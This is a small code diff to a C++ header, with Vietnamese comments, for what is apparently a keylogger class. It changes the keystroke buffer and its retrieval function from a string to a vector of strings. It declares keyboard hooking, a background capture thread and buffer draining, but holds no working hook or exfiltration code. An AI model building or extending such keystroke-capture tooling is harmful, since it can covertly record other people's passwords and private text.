@@ -11,7 +11,7 @@ private:
     // không thể gọi biến thành viên của Class C++ bình thường được.
     
     //static HHOOK _hook;             // "Cái móc" để câu sự kiện bàn phím
-    static std::string _buffer;     // Bộ nhớ đệm lưu tạm các phím vừa gõ
+    static std::vector<std::string> _buffer;     // Bộ nhớ đệm lưu tạm các phím vừa gõ
     static std::mutex _mtx;         // Cái khóa bảo vệ bộ nhớ đệm
     
     std::thread _workerThread;      // Luồng chạy ngầm của Keylogger
@@ -49,5 +49,5 @@ public:
     void Stop();  // Dừng theo dõi
 
     // Hàm quan trọng: Lấy dữ liệu ra và xóa sạch bộ đệm cũ
-    static std::string getDataAndClear();
+    static std::vector<std::string> getDataAndClear();
 };
